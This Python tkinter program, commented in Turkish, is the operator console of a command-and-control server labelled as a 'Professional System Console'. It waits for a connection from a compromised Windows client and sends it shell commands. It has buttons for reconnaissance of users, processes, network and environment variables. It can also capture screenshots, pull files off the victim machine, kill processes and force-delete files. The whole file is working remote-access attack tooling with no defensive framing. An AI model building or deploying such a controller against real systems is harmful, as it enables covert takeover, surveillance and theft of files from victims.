import socket
import json
import os
import threading
import time
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
from datetime import datetime

IP = '127.0.0.1'
PORT = 1234

class C2ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Antigravity Professional System Console - Premium Edition")
        self.root.geometry("1200x850")
        
        # UI Renk Paleti (Karanlık Mod)
        self.bg_color = "#1e1e1e"
        self.fg_color = "#ffffff"
        self.accent_color = "#007acc"
        self.accent_hover = "#0098ff"
        self.entry_bg = "#2d2d2d"
        self.btn_bg = "#3c3c3c"
        self.btn_hover = "#505050"
        self.sidebar_bg = "#252526"
        self.terminal_bg = "#0c0c0c"
        
        self.root.configure(bg=self.bg_color)
        
        # Soket ve İstatistik Durumları
        self.server_socket = None
        self.target_socket = None
        self.client_ip = None
        self.running = True
        self.sent_count = 0
        self.recv_count = 0
        self.conn_start_time = None
        
        # Komut Geçmişi Belleği (Yukarı/Aşağı Tuşları İçin)
        self.command_history = []
        self.history_index = -1
        
        # Otomatik Kaydırma Durumu
        self.autoscroll_var = tk.BooleanVar(value=True)
        
        # Tema ve Stil Ayarları
        self.setup_styles()
        self.create_widgets()
        
        # Oturum Süresi Güncelleme Döngüsü
        self.update_uptime_loop()
        
        # Sunucu Thread'ini Başlat
        self.server_thread = threading.Thread(target=self.start_server, daemon=True)
        self.server_thread.start()
        
        # Klavye Kısayolları (Global bindings)
        self.root.bind("<Control-l>", lambda e: self.clear_terminal())
        self.root.bind("<Control-f>", lambda e: self.search_entry.focus_set())
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def setup_styles(self):
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Sekme Tasarımı Değişiklikleri
        self.style.configure("TNotebook", background=self.sidebar_bg, borderwidth=0)
        self.style.configure("TNotebook.Tab", background=self.btn_bg, foreground=self.fg_color, borderwidth=0, padding=[10, 5])
        self.style.map("TNotebook.Tab", background=[("selected", self.accent_color)])

    def create_widgets(self):
        # 1. Üst Panel (İstatistikler ve Canlı Göstergeler)
        header_frame = tk.Frame(self.root, bg=self.sidebar_bg, height=60)
        header_frame.pack(fill=tk.X, side=tk.TOP)
        
        # LED Durum İndikatörü
        self.status_canvas = tk.Canvas(header_frame, width=15, height=15, bg=self.sidebar_bg, highlightthickness=0)
        self.status_canvas.pack(side=tk.LEFT, padx=(20, 5), pady=20)
        self.status_dot = self.status_canvas.create_oval(2, 2, 13, 13, fill="yellow")

        self.status_label = tk.Label(
            header_frame, 
            text=f"Soket Durumu: DİNLENİYOR ({IP}:{PORT})", 
            fg="#ffcc00", 
            bg=self.sidebar_bg, 
            font=("Consolas", 11, "bold")
        )
        self.status_label.pack(side=tk.LEFT, padx=5, pady=20)

        # İstatistik Kartları
        self.uptime_label = tk.Label(
            header_frame, 
            text="Oturum Süresi: 00:00:00", 
            fg="#aaaaaa", 
            bg=self.sidebar_bg, 
            font=("Consolas", 10)
        )
        self.uptime_label.pack(side=tk.RIGHT, padx=20, pady=20)

        self.stats_label = tk.Label(
            header_frame, 
            text="Gönderilen: 0 | Alınan: 0", 
            fg="#aaaaaa", 
            bg=self.sidebar_bg, 
            font=("Consolas", 10)
        )
        self.stats_label.pack(side=tk.RIGHT, padx=20, pady=20)

        # Ana Grid Konteyner
        main_container = tk.Frame(self.root, bg=self.bg_color)
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # 2. Sol Bölüm: Bağlantı Geçmişi (Log Listbox)
        history_panel = tk.Frame(main_container, bg=self.sidebar_bg, width=200)
        history_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
        history_panel.pack_propagate(False)

        tk.Label(
            history_panel, 
            text="BAĞLANTI GEÇMİŞİ", 
            fg=self.fg_color, 
            bg=self.sidebar_bg, 
            font=("Consolas", 10, "bold")
        )
        history_title_sep = tk.Label(history_panel, text="-------------------", fg="#444444", bg=self.sidebar_bg)
        history_title_sep.pack(pady=(5, 5))

        self.history_listbox = tk.Listbox(
            history_panel, 
            bg=self.terminal_bg, 
            fg="#00ff00", 
            selectbackground=self.accent_color,
            font=("Consolas", 9),
            borderwidth=0,
            highlightthickness=0
        )
        self.history_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 3. Orta Bölüm: Terminal / Konsol ve Arama Paneli
        center_panel = tk.Frame(main_container, bg=self.bg_color)
        center_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        # Arama ve Filtreleme Kontrolleri
        search_frame = tk.Frame(center_panel, bg=self.bg_color)
        search_frame.pack(fill=tk.X, pady=(0, 5))
        
        tk.Label(search_frame, text="Çıktıda Ara:", fg="#aaaaaa", bg=self.bg_color, font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        self.search_entry = tk.Entry(search_frame, bg=self.entry_bg, fg=self.fg_color, insertbackground=self.fg_color, font=("Consolas", 10))
        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        search_btn = tk.Button(search_frame, text="Ara", command=self.search_text, bg=self.btn_bg, fg=self.fg_color, relief=tk.FLAT, font=("Consolas", 9))
        search_btn.pack(side=tk.LEFT, padx=2)
        self.setup_hover(search_btn, self.btn_bg, self.btn_hover)

        clear_search_btn = tk.Button(search_frame, text="Temizle", command=self.clear_search_highlights, bg=self.btn_bg, fg=self.fg_color, relief=tk.FLAT, font=("Consolas", 9))
        clear_search_btn.pack(side=tk.LEFT, padx=2)
        self.setup_hover(clear_search_btn, self.btn_bg, self.btn_hover)

        # Otomatik Kaydırma Seçeneği (UI Toggle)
        autoscroll_cb = tk.Checkbutton(
            search_frame, 
            text="Otomatik Kaydır", 
            variable=self.autoscroll_var, 
            onvalue=True, 
            offvalue=False,
            bg=self.bg_color,
            fg="#aaaaaa",
            selectcolor=self.bg_color,
            activebackground=self.bg_color,
            activeforeground=self.fg_color,
            font=("Consolas", 9)
        )
        autoscroll_cb.pack(side=tk.RIGHT, padx=5)

        # Konsol Log Metin Alanı
        self.log_area = scrolledtext.ScrolledText(
            center_panel, 
            bg=self.terminal_bg, 
            fg="#00ff00", 
            insertbackground="#00ff00", 
            font=("Consolas", 10)
        )
        self.log_area.pack(fill=tk.BOTH, expand=True)
        self.log_area.insert(tk.END, "[*] Konsol başlatıldı. Bağlantı bekleniyor...\n")
        self.log_area.configure(state=tk.DISABLED)

        # Renklendirme etiketleri
        self.log_area.tag_config("cmd", foreground="#00aaff")
        self.log_area.tag_config("response", foreground="#00ff00")
        self.log_area.tag_config("error", foreground="#ff5555")
        self.log_area.tag_config("info", foreground="#ffcc00")

        # Alt Giriş Paneli
        input_frame = tk.Frame(center_panel, bg=self.bg_color)
        input_frame.pack(fill=tk.X, pady=10)
        
        self.command_entry = tk.Entry(
            input_frame, 
            bg=self.entry_bg, 
            fg=self.fg_color, 
            insertbackground=self.fg_color, 
            font=("Consolas", 11)
        )
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=4)
        
        # Klavye Kısayol Atamaları
        self.command_entry.bind("<Return>", lambda e: self.send_command())
        self.command_entry.bind("<Up>", self.navigate_history_up)
        self.command_entry.bind("<Down>", self.navigate_history_down)
        self.command_entry.config(state=tk.DISABLED)
        
        self.send_btn = tk.Button(
            input_frame, 
            text="Gönder", 
            command=self.send_command, 
            bg=self.accent_color, 
            fg=self.fg_color, 
            state=tk.DISABLED,
            font=("Consolas", 10, "bold"),
            relief=tk.FLAT
        )
        self.send_btn.pack(side=tk.RIGHT, padx=5)
        self.setup_hover(self.send_btn, self.accent_color, self.accent_hover)

        # 4. Sağ Bölüm: Sistem Kontrol Paneli (Sidebar - Dikey Kaydırma & Sekmeli Yapı)
        sidebar_container = tk.Frame(main_container, bg=self.sidebar_bg, width=240)
        sidebar_container.pack(side=tk.RIGHT, fill=tk.Y, padx=(10, 0))
        sidebar_container.pack_propagate(False)

        # İstemci Detay Kartı
        tk.Label(
            sidebar_container, 
            text="İSTEMCİ BİLGİSİ", 
            fg=self.fg_color, 
            bg=self.sidebar_bg, 
            font=("Consolas", 10, "bold")
        )
        self.client_info_label = tk.Label(
            sidebar_container,
            text="Cihaz: Bağlı Değil\nIP: ---\nZaman: ---",
            fg="#888888",
            bg=self.entry_bg,
            justify=tk.LEFT,
            font=("Consolas", 9),
            padx=10,
            pady=8
        )
        self.client_info_label.pack(fill=tk.X, padx=10, pady=5)

        # Sekmeli Kontrol Alanı (Notebook)
        self.notebook = ttk.Notebook(sidebar_container)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.tab_general = tk.Frame(self.notebook, bg=self.sidebar_bg)
        self.tab_diagnostics = tk.Frame(self.notebook, bg=self.sidebar_bg)
        self.tab_actions = tk.Frame(self.notebook, bg=self.sidebar_bg)

        self.notebook.add(self.tab_general, text="Dizin")
        self.notebook.add(self.tab_diagnostics, text="Teşhis")
        self.notebook.add(self.tab_actions, text="Eylemler")

        self.control_buttons = {}

        # Dizin Gezinme Sekmesi İçeriği
        self.add_sidebar_button("Mevcut Konum (pwd)", lambda: self.quick_command("pwd"), self.tab_general)
        self.add_sidebar_button("Dosya Listele (ls)", lambda: self.quick_command("ls"), self.tab_general)
        self.add_sidebar_button("Dizin Yukarı (cd ..)", lambda: self.quick_command("cd .."), self.tab_general)
        self.add_sidebar_button("Kök Dizin (cd \\)", lambda: self.quick_command("cd \\"), self.tab_general)

        # Teşhis Sekmesi İçeriği
        self.add_sidebar_button("Çalışan Süreçler", lambda: self.quick_command("tasklist"), self.tab_diagnostics)
        self.add_sidebar_button("Aktif Servisler", lambda: self.quick_command("sc query type= service state= all"), self.tab_diagnostics)
        self.add_sidebar_button("Disk Bilgisi", lambda: self.quick_command("wmic logicaldisk get size,freespace,caption"), self.tab_diagnostics)
        self.add_sidebar_button("Ağ Yapılandırması", lambda: self.quick_command("ipconfig /all"), self.tab_diagnostics)
        self.add_sidebar_button("Açık Bağlantılar", lambda: self.quick_command("netstat -ano"), self.tab_diagnostics)
        self.add_sidebar_button("Ağ Ping Testi", lambda: self.quick_command("ping 127.0.0.1 -n 4"), self.tab_diagnostics)
        self.add_sidebar_button("Sistem Kullanıcıları", lambda: self.quick_command("net user"), self.tab_diagnostics)
        self.add_sidebar_button("Çevre Değişkenleri", lambda: self.quick_command("set"), self.tab_diagnostics)
        self.add_sidebar_button("İşlemci Bilgisi", lambda: self.quick_command("wmic cpu get name,numberofcores,maxclockspeed"), self.tab_diagnostics)
        self.add_sidebar_button("Yönlendirme Tablosu", lambda: self.quick_command("route print"), self.tab_diagnostics)

        # Eylemler Sekmesi İçeriği (İşlevsel Yeni Butonlar Eklendi)
        self.add_sidebar_button("Ekran Görüntüsü Al", self.trigger_screenshot, self.tab_actions, is_accent=True)
        self.add_sidebar_button("Dosya İndir", self.trigger_download, self.tab_actions, is_accent=True)
        self.add_sidebar_button("İçeriği Oku (cat)", self.trigger_cat, self.tab_actions)
        self.add_sidebar_button("Süreç Durdur (kill)", self.trigger_kill, self.tab_actions)
        self.add_sidebar_button("Yeni Klasör (mkdir)", self.trigger_mkdir, self.tab_actions)
        self.add_sidebar_button("Dosya / Klasör Sil", self.trigger_delete, self.tab_actions)

        # Alt Araçlar (Her zaman görünür)
        lbl = tk.Label(sidebar_container, text="KONSOL YÖNETİMİ", fg="#888888", bg=self.sidebar_bg, font=("Consolas", 9, "bold"))
        lbl.pack(pady=(10, 5))
        
        self.clear_btn = tk.Button(
            sidebar_container, 
            text="Ekranı Temizle (Ctrl+L)", 
            command=self.clear_terminal, 
            bg=self.btn_bg, 
            fg=self.fg_color, 
            relief=tk.FLAT,
            font=("Consolas", 9)
        )
        self.clear_btn.pack(fill=tk.X, padx=15, pady=3)
        self.setup_hover(self.clear_btn, self.btn_bg, self.btn_hover)

        self.export_btn = tk.Button(
            sidebar_container, 
            text="Logları Dışa Aktar", 
            command=self.export_logs, 
            bg=self.btn_bg, 
            fg=self.fg_color, 
            relief=tk.FLAT,
            font=("Consolas", 9)
        )
        self.export_btn.pack(fill=tk.X, padx=15, pady=3)
        self.setup_hover(self.export_btn, self.btn_bg, self.btn_hover)

    def setup_hover(self, widget, normal_color, hover_color):
        widget.bind("<Enter>", lambda e: widget.config(bg=hover_color))
        widget.bind("<Leave>", lambda e: widget.config(bg=normal_color))

    def add_sidebar_button(self, text, command, parent_tab, is_accent=False):
        color = self.accent_color if is_accent else self.btn_bg
        hover = self.accent_hover if is_accent else self.btn_hover
        btn = tk.Button(
            parent_tab, 
            text=text, 
            command=command, 
            bg=color, 
            fg=self.fg_color, 
            state=tk.DISABLED,
            font=("Consolas", 9, "bold" if is_accent else "normal"),
            relief=tk.FLAT
        )
        btn.pack(fill=tk.X, padx=15, pady=4)
        self.setup_hover(btn, color, hover)
        self.control_buttons[text] = btn

    def log(self, message, tag=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_area.configure(state=tk.NORMAL)
        
        insert_text = f"[{timestamp}] {message}\n"
        if tag:
            self.log_area.insert(tk.END, insert_text, tag)
        else:
            self.log_area.insert(tk.END, insert_text)
            
        if self.autoscroll_var.get():
            self.log_area.see(tk.END)
        self.log_area.configure(state=tk.DISABLED)

    def clear_terminal(self):
        self.log_area.configure(state=tk.NORMAL)
        self.log_area.delete(1.0, tk.END)
        self.log_area.insert(tk.END, "[*] Konsol temizlendi.\n")
        self.log_area.configure(state=tk.DISABLED)

    def search_text(self):
        self.clear_search_highlights()
        query = self.search_entry.get().strip()
        if not query:
            return
        
        start_pos = "1.0"
        while True:
            start_pos = self.log_area.search(query, start_pos, stopindex=tk.END, nocase=True)
            if not start_pos:
                break
            end_pos = f"{start_pos}+{len(query)}c"
            self.log_area.tag_add("match", start_pos, end_pos)
            self.log_area.tag_config("match", background="#007acc", foreground="#ffffff")
            start_pos = end_pos

    def clear_search_highlights(self):
        self.log_area.tag_remove("match", "1.0", tk.END)

    def update_stats(self):
        self.stats_label.config(text=f"Gönderilen: {self.sent_count} | Alınan: {self.recv_count}")

    def update_uptime_loop(self):
        if self.conn_start_time and self.target_socket:
            delta = int(time.time() - self.conn_start_time)
            hours, remainder = divmod(delta, 3600)
            minutes, seconds = divmod(remainder, 60)
            uptime_str = f"Oturum Süresi: {hours:02d}:{minutes:02d}:{seconds:02d}"
            self.uptime_label.config(text=uptime_str, fg="#00ff00")
        else:
            self.uptime_label.config(text="Oturum Süresi: --:--:--", fg="#aaaaaa")
        
        if self.running:
            self.root.after(1000, self.update_uptime_loop)

    def add_to_history_list(self, ip_address, status):
        time_str = datetime.now().strftime("%H:%M:%S")
        self.history_listbox.insert(0, f"[{time_str}] {ip_address} - {status}")

    def export_logs(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".log", 
            filetypes=[("Log Dosyası", "*.log"), ("Metin Dosyası", "*.txt")]
        )
        if file_path:
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(self.log_area.get(1.0, tk.END))
                messagebox.showinfo("Başarılı", "Konsol çıktıları başarıyla dışa aktarıldı.")
            except Exception as e:
                messagebox.showerror("Hata", f"Dışa aktarım sırasında hata oluştu: {str(e)}")

    def navigate_history_up(self, event):
        if not self.command_history:
            return "break"
        if self.history_index == -1:
            self.history_index = len(self.command_history) - 1
        elif self.history_index > 0:
            self.history_index -= 1
        
        self.command_entry.delete(0, tk.END)
        self.command_entry.insert(0, self.command_history[self.history_index])
        return "break"

    def navigate_history_down(self, event):
        if not self.command_history or self.history_index == -1:
            return "break"
        
        if self.history_index < len(self.command_history) - 1:
            self.history_index += 1
            self.command_entry.delete(0, tk.END)
            self.command_entry.insert(0, self.command_history[self.history_index])
        else:
            self.history_index = -1
            self.command_entry.delete(0, tk.END)
        return "break"

    def translate_command(self, command):
        cmd_lower = command.strip().lower()
        if cmd_lower == "pwd":
            return "echo %cd%"
        elif cmd_lower == "ls":
            return "dir"
        elif cmd_lower == "clear":
            self.root.after(0, self.clear_terminal)
            return None
        elif cmd_lower == "query user":
            return "net user"
        elif cmd_lower.startswith("cat "):
            filename = command[4:].strip()
            return f"type {filename}"
        return command

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((IP, PORT))
            self.server_socket.listen(1)
            self.server_socket.settimeout(1.0)
            
            while self.running:
                try:
                    self.target_socket, ip_info = self.server_socket.accept()
                    self.client_ip = ip_info[0]
                    self.root.after(0, self.on_client_connected)
                    break
                except socket.timeout:
                    continue
        except Exception as e:
            self.root.after(0, lambda: self.log(f"[-] Sunucu hatası: {str(e)}", "error"))

    def on_client_connected(self):
        self.status_canvas.itemconfig(self.status_dot, fill="green")
        self.status_label.config(text=f"Soket Durumu: BAĞLANDI ({self.client_ip})", fg="#00ff00")
        
        # İstemci Kartı Güncellemesi
        conn_time = datetime.now().strftime('%H:%M:%S')
        self.client_info_label.config(
            text=f"Cihaz: Windows\nIP: {self.client_ip}\nZaman: {conn_time}",
            fg="#ffffff"
        )
        
        self.conn_start_time = time.time()
        self.log(f"[+] Bağlantı kuruldu: {self.client_ip}", "info")
        self.add_to_history_list(self.client_ip, "Bağlandı")
        
        # Kontrolleri Aktif Et
        for btn in self.control_buttons.values():
            btn.config(state=tk.NORMAL)
        self.command_entry.config(state=tk.NORMAL)
        self.send_btn.config(state=tk.NORMAL)
        self.command_entry.focus()

    def j_send(self, data):
        try:
            jsondata = json.dumps(data)
            self.target_socket.send(jsondata.encode())
            self.sent_count += 1
            self.root.after(0, self.update_stats)
            return True
        except Exception as e:
            self.log(f"[-] Gönderim hatası: {str(e)}", "error")
            self.on_disconnect()
            return False

    def j_recv(self):
        data = ''
        while self.running:
            try:
                chunk = self.target_socket.recv(1024).decode().rstrip()
                if not chunk:
                    return None
                data = data + chunk
                self.recv_count += 1
                self.root.after(0, self.update_stats)
                return json.loads(data)
            except ValueError:
                continue
            except Exception as e:
                return None

    def execute_command_thread(self, raw_command):
        command = self.translate_command(raw_command)
        if command is None:
            return

        if not self.j_send(command):
            return

        if command == 'quit':
            self.root.after(0, self.on_disconnect)
            return

        if command.startswith('download '):
            file_size = self.j_recv()
            if isinstance(file_size, int) and file_size > 0:
                filename = command[9:].strip()
                basename = os.path.basename(filename)
                self.root.after(0, lambda: self.log(f"[*] Dosya indiriliyor... Boyut: {file_size} bayt", "info"))
                
                try:
                    with open(basename, 'wb') as f:
                        data_received = 0
                        while data_received < file_size:
                            chunk = self.target_socket.recv(min(file_size - data_received, 1024))
                            if not chunk:
                                break
                            f.write(chunk)
                            data_received += len(chunk)
                    self.root.after(0, lambda: self.log(f"[+] Dosya başarıyla indirildi: {basename}", "response"))
                except Exception as e:
                    self.root.after(0, lambda: self.log(f"[-] İndirme hatası: {str(e)}", "error"))
            else:
                self.root.after(0, lambda: self.log("[-] Dosya bulunamadı veya boş!", "error"))

        elif command == 'screenshot':
            file_size = self.j_recv()
            if isinstance(file_size, int) and file_size > 0:
                self.root.after(0, lambda: self.log(f"[*] Ekran görüntüsü alınıyor... Boyut: {file_size} bayt", "info"))
                
                try:
                    filename = "screenshot.png"
                    with open(filename, 'wb') as f:
                        data_received = 0
                        while data_received < file_size:
                            chunk = self.target_socket.recv(min(file_size - data_received, 1024))
                            if not chunk:
                                break
                            f.write(chunk)
                            data_received += len(chunk)
                    self.root.after(0, lambda: self.log(f"[+] Ekran görüntüsü başarıyla kaydedildi: {filename}", "response"))
                except Exception as e:
                    self.root.after(0, lambda: self.log(f"[-] Ekran görüntüsü kaydetme hatası: {str(e)}", "error"))
            else:
                self.root.after(0, lambda: self.log("[-] Ekran görüntüsü alınamadı!", "error"))

        else:
            response = self.j_recv()
            if response is not None:
                self.root.after(0, lambda: self.log(str(response), "response"))
            else:
                self.root.after(0, lambda: self.log("[-] Bağlantı kesildi.", "error"))
                self.root.after(0, self.on_disconnect)

    def send_command(self):
        command = self.command_entry.get().strip()
        if not command:
            return
        
        if not self.command_history or self.command_history[-1] != command:
            self.command_history.append(command)
        self.history_index = -1
        
        self.command_entry.delete(0, tk.END)
        self.log(f"shell ~ {self.client_ip} : {command}", "cmd")
        threading.Thread(target=self.execute_command_thread, args=(command,), daemon=True).start()

    def quick_command(self, cmd):
        self.log(f"shell ~ {self.client_ip} : {cmd}", "cmd")
        threading.Thread(target=self.execute_command_thread, args=(cmd,), daemon=True).start()

    def trigger_screenshot(self):
        self.quick_command("screenshot")

    def trigger_download(self):
        self.spawn_input_dialog("Dosya İndir", "Hedef dosya yolunu girin:", lambda path: f"download {path}")

    def trigger_cat(self):
        self.spawn_input_dialog("Dosya İçeriğini Oku", "Okunacak dosya yolunu girin:", lambda path: f"cat {path}")

    def trigger_kill(self):
        self.spawn_input_dialog("Süreç Durdur", "Durdurulacak işlem adı veya PID girin:\n(Örn: notepad.exe veya 1234)", lambda target: f"taskkill /F /IM {target}" if not target.isdigit() else f"taskkill /F /PID {target}")

    def trigger_mkdir(self):
        self.spawn_input_dialog("Yeni Klasör Oluştur", "Oluşturulacak klasör yolunu/adını girin:", lambda path: f"mkdir {path}")

    def trigger_delete(self):
        self.spawn_input_dialog("Dosya / Klasör Sil", "Silinecek dosya veya klasör yolunu girin:\n(Dikkat: Geri alınamaz!)", lambda path: f"del /f /q {path}")

    def spawn_input_dialog(self, title, label_text, command_builder):
        dialog = tk.Toplevel(self.root)
        dialog.title(title)
        dialog.geometry("350x150")
        dialog.configure(bg=self.bg_color)
        dialog.transient(self.root)
        dialog.grab_set()

        label = tk.Label(dialog, text=label_text, fg=self.fg_color, bg=self.bg_color, font=("Consolas", 9), justify=tk.LEFT)
        label.pack(pady=10)

        entry = tk.Entry(dialog, width=35, bg=self.entry_bg, fg=self.fg_color, insertbackground=self.fg_color)
        entry.pack(pady=5)
        entry.focus()

        def on_ok():
            val = entry.get().strip()
            if val:
                dialog.destroy()
                self.quick_command(command_builder(val))
            else:
                dialog.destroy()

        ok_btn = tk.Button(dialog, text="Tamam", command=on_ok, bg=self.accent_color, fg=self.fg_color, relief=tk.FLAT)
        ok_btn.pack(pady=10)
        self.setup_hover(ok_btn, self.accent_color, self.accent_hover)

    def on_disconnect(self):
        self.status_canvas.itemconfig(self.status_dot, fill="red")
        self.status_label.config(text=f"Soket Durumu: DİNLENİYOR ({IP}:{PORT})", fg="#ffcc00")
        
        self.client_info_label.config(
            text="Cihaz: Bağlı Değil\nIP: ---\nZaman: ---",
            fg="#888888"
        )
        
        if self.client_ip:
            self.add_to_history_list(self.client_ip, "Koptu")
            
        self.client_ip = None
        self.conn_start_time = None
        
        for btn in self.control_buttons.values():
            btn.config(state=tk.DISABLED)
        self.command_entry.config(state=tk.DISABLED)
        self.send_btn.config(state=tk.DISABLED)
        
        if self.target_socket:
            try:
                self.target_socket.close()
            except:
                pass
            self.target_socket = None
        
        self.server_thread = threading.Thread(target=self.start_server, daemon=True)
        self.server_thread.start()

    def on_close(self):
        self.running = False
        if self.target_socket:
            try:
                self.target_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = C2ServerGUI(root)
    root.mainloop()